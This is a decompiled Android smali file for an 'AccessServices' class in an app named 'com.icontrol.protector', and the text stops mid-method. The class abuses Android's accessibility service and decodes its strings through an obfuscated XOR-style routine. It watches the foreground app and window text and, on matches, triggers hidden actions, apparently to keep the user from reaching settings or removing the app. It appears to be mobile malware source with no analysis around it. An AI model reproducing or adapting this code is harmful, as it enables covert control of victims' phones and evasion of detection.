.class public Lcom/icontrol/protector/AccessServices;
.super Landroid/accessibilityservice/AccessibilityService;
.source "SourceFile"


# static fields
.field public static A:Z = false

.field public static B:Ljava/lang/Boolean; = null

.field public static C:Ljava/lang/Boolean; = null

.field public static D:Ljava/lang/Boolean; = null

.field public static E:Ljava/lang/Boolean; = null

.field public static F:Ljava/lang/Boolean; = null

.field public static G:Ljava/lang/Boolean; = null

.field public static H:Landroid/view/accessibility/AccessibilityNodeInfo; = null

.field public static I:Ljava/lang/String; = null

.field public static J:Landroid/widget/FrameLayout; = null

.field public static K:Landroid/view/WindowManager$LayoutParams; = null

.field public static L:Landroid/widget/TextView; = null

.field static M:Ljava/util/HashMap; = null

.field private static N:Ljava/lang/String; = null

.field private static O:Ljava/lang/String; = null

.field private static P:Ljava/lang/String; = null

.field private static Q:Ljava/util/Map; = null

.field private static R:Ljava/util/Map; = null

.field public static S:Ljava/lang/String; = null

.field public static T:I = 0x0

.field public static U:Ljava/lang/String; = null

.field private static V:I = 0x0

.field private static volatile W:J = 0x0L

.field public static q:I = 0x1e

.field public static r:Ljava/lang/String;

.field public static s:Ljava/lang/String;

.field public static t:Ljava/lang/String;

.field public static u:Z

.field public static v:Landroid/view/WindowManager;

.field public static w:Landroid/view/WindowManager$LayoutParams;

.field public static x:Landroid/view/WindowManager;

.field public static y:Z

.field public static z:Z


# instance fields
.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/util/List;

.field private e:Ljava/lang/String;

.field private f:Ljava/lang/String;

.field public g:I

.field public h:I

.field i:I

.field private j:Z

.field private k:Z

.field l:Z

.field m:Z

.field private final n:Ljava/util/concurrent/ExecutorService;

.field private o:I

.field private final p:Ljava/util/concurrent/ThreadPoolExecutor;


# direct methods
.method static constructor <clinit>()V
    .locals 4

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->r:Ljava/lang/String;

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    const-string v1, ""

    sput-object v1, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    const/4 v2, 0x0

    sput-boolean v2, Lcom/icontrol/protector/AccessServices;->u:Z

    sput-boolean v2, Lcom/icontrol/protector/AccessServices;->y:Z

    sput-boolean v2, Lcom/icontrol/protector/AccessServices;->z:Z

    sput-boolean v2, Lcom/icontrol/protector/AccessServices;->A:Z

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->B:Ljava/lang/Boolean;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->C:Ljava/lang/Boolean;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->D:Ljava/lang/Boolean;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->E:Ljava/lang/Boolean;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->F:Ljava/lang/Boolean;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->G:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/accessibility/AccessibilityNodeInfo;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->I:Ljava/lang/String;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->M:Ljava/util/HashMap;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->N:Ljava/lang/String;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    sput v2, Lcom/icontrol/protector/AccessServices;->T:I

    sput-object v1, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    const/4 v0, 0x1

    sput v0, Lcom/icontrol/protector/AccessServices;->V:I

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/AccessServices;->W:J

    return-void

    :array_0
    .array-data 1
        0x75t
        0x64t
        -0x17t
        0x44t
        0xct
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3et
        0xat
        -0x7at
        0x33t
        0x62t
        0x37t
        -0x53t
        0x30t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 9

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->b:Ljava/lang/String;

    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->c:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->e:Ljava/lang/String;

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->f:Ljava/lang/String;

    const/4 v0, 0x0

    iput v0, p0, Lcom/icontrol/protector/AccessServices;->i:I

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->j:Z

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->k:Z

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->l:Z

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->m:Z

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v1

    iput-object v1, p0, Lcom/icontrol/protector/AccessServices;->n:Ljava/util/concurrent/ExecutorService;

    iput v0, p0, Lcom/icontrol/protector/AccessServices;->o:I

    new-instance v0, Ljava/util/concurrent/ThreadPoolExecutor;

    const/16 v3, 0xa

    const/16 v4, 0xa

    const-wide/16 v5, 0xf

    sget-object v7, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    new-instance v8, Ljava/util/concurrent/LinkedBlockingQueue;

    invoke-direct {v8}, Ljava/util/concurrent/LinkedBlockingQueue;-><init>()V

    move-object v2, v0

    invoke-direct/range {v2 .. v8}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->p:Ljava/util/concurrent/ThreadPoolExecutor;

    return-void

    nop

    :array_0
    .array-data 1
        0x24t
        0x3t
        0x39t
        -0x3t
        -0x78t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x41t
        0x6et
        0x49t
        -0x77t
        -0xft
        0xft
        0x16t
        -0x3ft
    .end array-data

    :array_2
    .array-data 1
        -0x30t
        0x64t
        -0x23t
        -0x76t
    .end array-data

    :array_3
    .array-data 1
        -0x42t
        0x11t
        -0x4ft
        -0x1at
        0x19t
        -0x70t
        -0x21t
        -0x11t
    .end array-data
.end method

.method private c(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 17

    .line 1
    move-object/from16 v0, p2

    move-object/from16 v1, p3

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p1 .. p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p2 .. p2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v7, 0xe

    const/16 v8, 0x14

    const/4 v9, 0x4

    const/16 v10, 0x19

    const/16 v11, 0x9

    const/16 v14, 0xa

    const/4 v15, 0x6

    const/16 v13, 0x8

    :try_start_0
    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v16

    const/16 v12, 0xd

    if-eqz v16, :cond_1

    new-array v6, v11, [B

    fill-array-data v6, :array_0

    new-array v11, v13, [B

    fill-array-data v11, :array_1

    invoke-static {v6, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_0

    new-array v6, v9, [B

    fill-array-data v6, :array_2

    new-array v11, v13, [B

    fill-array-data v11, :array_3

    invoke-static {v6, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_0

    new-array v6, v12, [B

    fill-array-data v6, :array_4

    new-array v11, v13, [B

    fill-array-data v11, :array_5

    invoke-static {v6, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_1

    :cond_0
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_1
    const/16 v6, 0x23

    new-array v6, v6, [B

    fill-array-data v6, :array_6

    new-array v11, v13, [B

    fill-array-data v11, :array_7

    invoke-static {v6, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    const/16 v11, 0x17

    if-eqz v6, :cond_2

    new-array v6, v11, [B

    fill-array-data v6, :array_8

    new-array v5, v13, [B

    fill-array-data v5, :array_9

    invoke-static {v6, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual/range {p3 .. p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2

    if-eqz v16, :cond_2

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_2
    new-array v5, v8, [B

    fill-array-data v5, :array_a

    new-array v6, v13, [B

    fill-array-data v6, :array_b

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    const/16 v5, 0x38

    new-array v5, v5, [B

    fill-array-data v5, :array_c

    new-array v6, v13, [B

    fill-array-data v6, :array_d

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    if-eqz v16, :cond_3

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_3
    new-array v5, v10, [B

    fill-array-data v5, :array_e

    new-array v6, v13, [B

    fill-array-data v6, :array_f

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_4

    if-eqz v16, :cond_4

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_4
    const/16 v5, 0x1a

    if-eqz v1, :cond_7

    const/16 v6, 0x26

    new-array v6, v6, [B

    fill-array-data v6, :array_10

    new-array v12, v13, [B

    fill-array-data v12, :array_11

    invoke-static {v6, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_5

    const/16 v6, 0x29

    new-array v6, v6, [B

    fill-array-data v6, :array_12

    new-array v12, v13, [B

    fill-array-data v12, :array_13

    invoke-static {v6, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_5

    const/16 v6, 0x1b

    new-array v6, v6, [B

    fill-array-data v6, :array_14

    new-array v12, v13, [B

    fill-array-data v12, :array_15

    invoke-static {v6, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_5

    new-array v6, v5, [B

    fill-array-data v6, :array_16

    new-array v12, v13, [B

    fill-array-data v12, :array_17

    invoke-static {v6, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_7

    :cond_5
    new-array v6, v8, [B

    fill-array-data v6, :array_18

    new-array v12, v13, [B

    fill-array-data v12, :array_19

    invoke-static {v6, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_6

    new-array v6, v11, [B

    fill-array-data v6, :array_1a

    new-array v11, v13, [B

    fill-array-data v11, :array_1b

    invoke-static {v6, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    :cond_6
    if-eqz v16, :cond_7

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_7
    new-array v0, v10, [B

    fill-array-data v0, :array_1c

    new-array v6, v13, [B

    fill-array-data v6, :array_1d

    invoke-static {v0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    if-eqz v0, :cond_8

    if-eqz v16, :cond_8

    :try_start_1
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    :catch_0
    :cond_8
    :try_start_2
    new-array v0, v10, [B

    fill-array-data v0, :array_1e

    new-array v6, v13, [B

    fill-array-data v6, :array_1f

    invoke-static {v0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    if-eqz v0, :cond_9

    if-eqz v16, :cond_9

    :try_start_3
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    return-void

    :catch_1
    :cond_9
    const/16 v0, 0x30

    :try_start_4
    new-array v0, v0, [B

    fill-array-data v0, :array_20

    new-array v6, v13, [B

    fill-array-data v6, :array_21

    invoke-static {v0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p3 .. p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    if-eqz v0, :cond_a

    if-eqz v16, :cond_a

    :try_start_5
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    return-void

    :catch_2
    :cond_a
    if-eqz v16, :cond_d

    :try_start_6
    new-array v0, v13, [B

    fill-array-data v0, :array_22

    new-array v1, v13, [B

    fill-array-data v1, :array_23

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_b

    new-array v0, v13, [B

    fill-array-data v0, :array_24

    new-array v1, v13, [B

    fill-array-data v1, :array_25

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_d

    :cond_b
    new-array v0, v14, [B

    fill-array-data v0, :array_26

    new-array v1, v13, [B

    fill-array-data v1, :array_27

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    new-array v0, v9, [B

    fill-array-data v0, :array_28

    new-array v1, v13, [B

    fill-array-data v1, :array_29

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    new-array v0, v13, [B

    fill-array-data v0, :array_2a

    new-array v1, v13, [B

    fill-array-data v1, :array_2b

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    new-array v0, v15, [B

    fill-array-data v0, :array_2c

    new-array v1, v13, [B

    fill-array-data v1, :array_2d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    new-array v0, v7, [B

    fill-array-data v0, :array_2e

    new-array v1, v13, [B

    fill-array-data v1, :array_2f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    if-eqz v0, :cond_d

    :cond_c
    :try_start_7
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    return-void

    :catch_3
    :cond_d
    if-eqz v16, :cond_e

    const/16 v0, 0xd

    :try_start_8
    new-array v1, v0, [B

    fill-array-data v1, :array_30

    new-array v0, v13, [B

    fill-array-data v0, :array_31

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_e

    new-array v0, v13, [B

    fill-array-data v0, :array_32

    new-array v1, v13, [B

    fill-array-data v1, :array_33

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_e

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_e
    if-eqz v16, :cond_10

    new-array v0, v5, [B

    fill-array-data v0, :array_34

    new-array v1, v13, [B

    fill-array-data v1, :array_35

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_f

    const/16 v0, 0x1c

    new-array v0, v0, [B

    fill-array-data v0, :array_36

    new-array v1, v13, [B

    fill-array-data v1, :array_37

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_f

    const/16 v0, 0x18

    new-array v1, v0, [B

    fill-array-data v1, :array_38

    new-array v0, v13, [B

    fill-array-data v0, :array_39

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    :cond_f
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_10
    if-eqz v16, :cond_13

    new-array v0, v15, [B

    fill-array-data v0, :array_3a

    new-array v1, v13, [B

    fill-array-data v1, :array_3b

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_3c

    new-array v1, v13, [B

    fill-array-data v1, :array_3d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v14, [B

    fill-array-data v0, :array_3e

    new-array v1, v13, [B

    fill-array-data v1, :array_3f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_11

    new-array v0, v13, [B

    fill-array-data v0, :array_40

    new-array v1, v13, [B

    fill-array-data v1, :array_41

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    :cond_11
    new-array v0, v14, [B

    fill-array-data v0, :array_42

    new-array v1, v13, [B

    fill-array-data v1, :array_43

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/4 v0, 0x3

    new-array v1, v0, [B

    fill-array-data v1, :array_44

    new-array v0, v13, [B

    fill-array-data v0, :array_45

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/4 v0, 0x7

    new-array v1, v0, [B

    fill-array-data v1, :array_46

    new-array v0, v13, [B

    fill-array-data v0, :array_47

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_48

    new-array v1, v13, [B

    fill-array-data v1, :array_49

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/4 v0, 0x5

    new-array v1, v0, [B

    fill-array-data v1, :array_4a

    new-array v0, v13, [B

    fill-array-data v0, :array_4b

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0x9

    new-array v1, v0, [B

    fill-array-data v1, :array_4c

    new-array v0, v13, [B

    fill-array-data v0, :array_4d

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v13, [B

    fill-array-data v0, :array_4e

    new-array v1, v13, [B

    fill-array-data v1, :array_4f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_50

    new-array v1, v13, [B

    fill-array-data v1, :array_51

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xc

    new-array v1, v0, [B

    fill-array-data v1, :array_52

    new-array v0, v13, [B

    fill-array-data v0, :array_53

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_54

    new-array v1, v13, [B

    fill-array-data v1, :array_55

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xc

    new-array v1, v0, [B

    fill-array-data v1, :array_56

    new-array v0, v13, [B

    fill-array-data v0, :array_57

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xc

    new-array v1, v0, [B

    fill-array-data v1, :array_58

    new-array v0, v13, [B

    fill-array-data v0, :array_59

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

